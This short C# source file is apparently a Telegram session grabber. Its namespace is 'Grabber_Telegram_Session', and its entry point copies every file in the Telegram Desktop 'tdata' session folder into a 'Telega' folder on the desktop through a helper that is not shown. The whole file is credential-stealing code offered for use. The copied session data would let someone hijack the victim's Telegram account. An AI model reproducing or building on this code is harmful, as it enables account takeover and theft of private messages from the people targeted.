namespace Grabber_Telegram_Session
{
    using System;
    using System.IO;

    internal partial class Program
    {
        private static readonly string Telegram = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Telegram Desktop");
        private static readonly string Desktop_Folder = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "Telega");

        private static void Main() => 
            CopySession.GetFilesSession("*.*", $"{Telegram}\\tdata", Desktop_Folder);
    }
}